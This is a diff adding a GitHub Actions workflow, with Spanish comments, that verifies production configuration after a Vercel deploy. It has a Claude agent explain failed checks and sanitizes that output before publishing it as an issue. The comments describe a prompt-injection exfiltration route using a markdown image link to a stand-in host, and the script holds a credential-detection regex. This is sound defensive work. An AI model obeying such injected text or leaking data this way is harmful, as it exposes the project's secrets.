@@ -1,0 +1,301 @@
+name: eureka-post-deploy
+
+# Agente de propósito específico: verificar la configuración después de cada
+# deploy a producción.
+#
+# Varias cosas que hacen falta para registrar una patente no viven en el código:
+# el signer del contrato, la dirección del proxy y del Marketplace, el bloque de
+# deploy. Si alguna queda mal, el deploy sale verde y producción se rompe en
+# silencio. Con EP-58, además, cada intento fallido paga una subida a Arweave
+# antes de revertir.
+#
+# Dos jobs separados a propósito. El primero baja de Vercel solo las variables
+# públicas que mide, corre un script determinista y valida su salida contra una
+# lista cerrada antes de subirla. El segundo, el del agente, no ve nada de
+# Vercel: recibe únicamente ese JSON ya validado.
+#
+# Lo que sí toca el primer job es VERCEL_TOKEN, el mismo secreto que usa
+# deploy.yml. El `if` que lo limita a master no alcanza como frontera: está en
+# este mismo archivo, que se puede editar en una rama. La frontera de verdad es
+# un GitHub Environment con los secretos de Vercel restringidos a master, que
+# tiene que configurar un admin del repo para este workflow y para deploy.yml
+# (ver docs/AGENTES.md).
+#
+# Mantiene un único issue vivo (etiqueta `post-deploy`): lo abre o actualiza
+# cuando hay errores y lo cierra cuando un deploy posterior sale limpio.
+
+on:
+  workflow_run:
+    workflows: ["Deploy to Vercel (Production)"]
+    types: [completed]
+  workflow_dispatch:
+
+concurrency:
+  group: eureka-post-deploy
+  cancel-in-progress: false
+
+jobs:
+  medir:
+    name: Medir la configuración
+    # deploy.yml también se puede disparar a mano sobre cualquier rama: por eso
+    # se mira head_branch y no solo que el deploy haya salido bien.
+    if: >-
+      (github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/master') ||
+      (github.event_name == 'workflow_run' &&
+        github.event.workflow_run.conclusion == 'success' &&
+        github.event.workflow_run.head_branch == 'master')
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: read
+    env:
+      VERCEL_ORG_ID: ${{ secrets.VERCEL_ORG_ID }}
+      VERCEL_PROJECT_ID: ${{ secrets.VERCEL_PROJECT_ID }}
+    outputs:
+      errores: ${{ steps.medir.outputs.errores }}
+      valido: ${{ steps.medir.outputs.valido }}
+
+    steps:
+      # El commit que se deployó, no el último de master: el script mira si ese
+      # código ya mintea desde el backend para saber qué exigir del signer.
+      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6
+        with:
+          ref: ${{ github.event.workflow_run.head_sha || github.sha }}
+          fetch-depth: 1
+          persist-credentials: false
+
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
+        with:
+          node-version-file: .nvmrc
+          cache: npm
+
+      # Antes de bajar nada de Vercel: los scripts de instalación de las
+      # dependencias corren acá.
+      - run: npm ci
+
+      # Todas las variables que se conservan son públicas: direcciones, un número
+      # de bloque y la dirección esperada del signer. El resto se borra en el
+      # mismo paso, pase lo que pase. El token va por entorno, no como argumento,
+      # para que no quede en la lista de procesos del runner.
+      - name: Bajar solo las variables que se miden
+        env:
+          VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
+        run: |
+          trap 'rm -rf .vercel' EXIT
+          npm install --global vercel@63.1.2
+          vercel pull --yes --environment=production
+          grep -E '^(NEXT_PUBLIC_PATENT_REGISTRY_ADDRESS|NEXT_PUBLIC_PATENT_MARKETPLACE_ADDRESS|PATENT_REGISTRY_DEPLOY_BLOCK|EUREKA_SIGNER_ADDRESS)=' \
+            .vercel/.env.production.local > post-deploy.env || true
+
+      # La validación corre antes de subir el artifact: si el JSON no tiene
+      # exactamente la forma esperada, no sale de este job.
+      - name: Medir y validar
+        id: medir
+        env:
+          DEPLOY_SHA: ${{ github.event.workflow_run.head_sha || github.sha }}
+        run: |
+          node scripts/postDeployCheck.mjs --env-file post-deploy.env > post-deploy.json
+          rm -f post-deploy.env
+          if node scripts/validatePostDeploy.mjs post-deploy.json; then
+            echo "valido=true" >> "$GITHUB_OUTPUT"
+            echo "errores=$(jq '.resumen.errores' post-deploy.json)" >> "$GITHUB_OUTPUT"
+            jq -c .resumen post-deploy.json
+          else
+            rm -f post-deploy.json
+            echo "valido=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      - if: steps.medir.outputs.valido == 'true'
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
+        with:
+          name: post-deploy
+          path: post-deploy.json
+          # Solo lo consume el job siguiente.
+          retention-days: 1
+
+  reportar:
+    name: Eureka Post-deploy
+    needs: medir
+    # Corre aunque `medir` falle: un verificador que se rompe en silencio es
+    # peor que no tener verificador.
+    if: always() && needs.medir.result != 'skipped'
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: read
+      issues: write
+      id-token: write
+
+    steps:
+      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6
+        with:
+          fetch-depth: 1
+          persist-credentials: false
+
+      - if: needs.medir.outputs.valido == 'true'
+        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        with:
+          name: post-deploy
+
+      - name: Explicar con el agente
+        if: >-
+          needs.medir.outputs.valido == 'true' &&
+          needs.medir.outputs.errores != '' && needs.medir.outputs.errores != '0'
+        uses: anthropics/claude-code-action@1d6de8cb0c237e7c15e9e1bdf973826ebae490cc # v1
+        with:
+          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          prompt: |
+            Sos el verificador post-deploy de Eureka. Acaba de salir un deploy
+            a producción y algunos chequeos de configuración fallaron.
+
+            Leé `post-deploy.json` en la raíz del workspace. Tiene cada
+            chequeo con su estado (ok, aviso, error, no_verificable), un
+            detalle y los datos públicos que se midieron. Para entender qué
+            hace cada pieza podés leer `.github/copilot-instructions.md` y, si
+            existe, `contracts/DEPLOYMENTS.md`.
+
+            **No inventes nada.** Solo podés hablar de los chequeos que están
+            en el JSON. No supongas valores de variables que no aparecen.
+
+            Escribí `post-deploy-report.md`:
+            1. Una línea: qué deja de funcionar en producción por estos
+               errores, en términos de usuario ("nadie puede registrar una
+               patente", "las compras revierten").
+            2. Una sección por cada chequeo en `error`, con: qué no coincide
+               (con las direcciones o valores del JSON), por qué rompe, y el
+               paso exacto para corregirlo y quién lo hace (variable en Vercel
+               → quien administra el proyecto de Vercel; transacción on-chain
+               como `setSigner` → el owner del contrato, con el comando de
+               `cast` o el script de contracts/script/ si existe).
+            3. Si hay chequeos en `aviso` o `no_verificable`, una lista corta
+               al final, una línea cada uno.
+
+            En castellano y breve. Sin título: el issue ya lo tiene. Sin
+            imágenes, HTML ni links fuera de github.com: el paso que publica
+            los saca.
+          claude_args: >-
+            --max-turns 15
+            --allowedTools "Read,Write,Glob,Grep"
+
+      - name: Publicar
+        uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b # v7
+        env:
+          MEDIR_RESULT: ${{ needs.medir.result }}
+          VALIDO: ${{ needs.medir.outputs.valido }}
+        with:
+          script: |
+            const fs = require('fs');
+            const etiqueta = 'post-deploy';
+            const run = `${context.serverUrl}/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}`;
+            // Última barrera antes de publicar lo que escribió el agente: si
+            // aparece algo con forma de credencial, no se publica.
+            const CREDENCIAL = /(gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|sk-ant-[A-Za-z0-9_-]{10,}|sk_(live|test)_[A-Za-z0-9]{10,}|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}|AKIA[0-9A-Z]{16}|-----BEGIN [A-Z ]*PRIVATE KEY-----)/;
+
+            // Sanea lo que se publica. Una instrucción inyectada en lo que lee el
+            // agente podría hacerle escribir ![](https://otro.host/?d=...): al
+            // mostrar el texto, GitHub baja la imagen por su proxy y el dato sale
+            // en la URL, aunque vaya partido o codificado y CREDENCIAL no lo
+            // reconozca. Por eso no queda nada que se cargue solo (imágenes, HTML,
+            // diagramas) ni links fuera de github.com.
+            // No interpreta markdown, escapa: así es más difícil de engañar, y el
+            // costo es que dentro de un bloque de código un `<` se ve como &lt;.
+            // Copia idéntica en eureka-resumen-pr, eureka-dod, eureka-post-deploy,
+            // eureka-blockers y eureka-progreso: si cambiás una, cambiá todas. No
+            // va en un archivo aparte porque el agente tiene Write y podría
+            // reemplazarlo antes de este paso.
+            const sanear = (texto) => String(texto)
+              // Sin `<` no hay etiquetas, comentarios ni <autolinks>.
+              .replace(/</g, '&lt;')
+              // Imágenes: la forma común se borra con su URL; cualquier otra
+              // (por referencia, con corchetes anidados) queda como texto.
+              .replace(/!\[([^\]]*)\]\([^)]*\)/g, '$1')
+              .replace(/!\[/g, '!\\[')
+              // Bloques que GitHub dibuja y que pueden pedir recursos afuera.
+              .replace(/(`{3,}|~{3,})[ \t]*(mermaid|geojson|topojson|stl)\b/gi, '$1text')
+              // Links: quedan solo los que van a github.com. Las definiciones
+              // por referencia ([x]: url) quedan como texto.
+              .replace(/\]\((?!\s*https:\/\/github\.com\/)/gi, ']\\(')
+              .replace(/\]:/g, ']\\:')
+              // URLs sueltas, que GitHub convierte en link: fuera de github.com
+              // dejan de serlo (https://otro.host pasa a hxxps://otro.host).
+              .replace(/(https?|ftp):\/\/(?!github\.com\/)/gi, (_, esquema) => `${esquema.replace(/t/gi, 'x')}://`)
+              .replace(/www\./gi, 'www\\.');
+
+            const { data: abiertos } = await github.rest.issues.listForRepo({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              state: 'open',
+              labels: etiqueta,
+            });
+            const issue = abiertos[0];
+
+            const publicar = async (body) => {
+              if (issue) {
+                await github.rest.issues.update({
+                  owner: context.repo.owner, repo: context.repo.repo,
+                  issue_number: issue.number, body,
+                });
+                core.notice(`Issue actualizado: #${issue.number}`);
+              } else {
+                const { data: nuevo } = await github.rest.issues.create({
+                  owner: context.repo.owner, repo: context.repo.repo,
+                  title: 'Deploy con configuración inconsistente',
+                  labels: [etiqueta],
+                  body,
+                });
+                core.notice(`Issue creado: #${nuevo.number}`);
+              }
+            };
+
+            // Tres casos, como en progreso: no se pudo medir, se midió y hay
+            // errores, o se midió y está todo bien. El primero tiene que verse
+            // como una falla y no como un deploy limpio.
+            if (process.env.VALIDO === 'false') {
+              await publicar('> **No se pudo verificar el deploy.** El resultado de la medición '
+                + 'no pasó la validación y no salió del job que mide. Revisá el log de '
+                + `\`validatePostDeploy.mjs\`: ${run}`);
+              return;
+            }
+            if (!fs.existsSync('post-deploy.json')) {
+              await publicar('> **No se pudo verificar el deploy.** El job que mide la '
+                + `configuración terminó en \`${process.env.MEDIR_RESULT}\`. Revisá el log: ${run}`);
+              return;
+            }
+
+            const facts = JSON.parse(fs.readFileSync('post-deploy.json', 'utf8'));
+            const r = facts.resumen;
+            const icono = { ok: '✅', aviso: '⚠️', error: '❌', no_verificable: '❓' };
+            // La tabla y el pie también pasan por sanear: salen de
+            // post-deploy.json, y el agente, que tiene Write, puede reescribirlo.
+            const tabla = sanear(['| Chequeo | Estado | Detalle |', '|---|---|---|']
+              .concat(facts.chequeos.map(c => `| ${c.titulo} | ${icono[c.estado] ?? c.estado} | ${c.detalle} |`))
+              .join('\n'));
+            const pie = `<sub>${sanear(`Deploy \`${(facts.commit ?? '').slice(0, 7)}\` · medido ${facts.generado} · [corrida](${run})`)}</sub>`;
+
+            await core.summary.addRaw(`## Verificación post-deploy\n\n${tabla}\n`).write();
+
+            if (r.errores > 0) {
+              let cuerpo = fs.existsSync('post-deploy-report.md')
+                ? fs.readFileSync('post-deploy-report.md', 'utf8')
+                : '> **El agente no dejó explicación.** La tabla de abajo sale del script y es correcta.';
+              if (CREDENCIAL.test(cuerpo)) {
+                core.warning('La explicación del agente parecía contener una credencial: no se publica');
+                cuerpo = '> **Se descartó la explicación del agente** porque parecía contener una '
+                  + `credencial. La tabla de abajo sale del script y es correcta. Revisá la corrida: ${run}`;
+              }
+              await publicar(`${sanear(cuerpo)}\n\n---\n\n${tabla}\n\n${pie}`);
+              return;
+            }
+
+            if (issue) {
+              await github.rest.issues.createComment({
+                owner: context.repo.owner, repo: context.repo.repo,
+                issue_number: issue.number,
+                body: `Resuelto: el deploy \`${(facts.commit ?? '').slice(0, 7)}\` pasó todos los chequeos sin errores.\n\n${tabla}\n\n${pie}`,
+              });
+              await github.rest.issues.update({
+                owner: context.repo.owner, repo: context.repo.repo,
+                issue_number: issue.number, state: 'closed',
+              });
+              core.notice(`Issue #${issue.number} cerrado`);
+            }
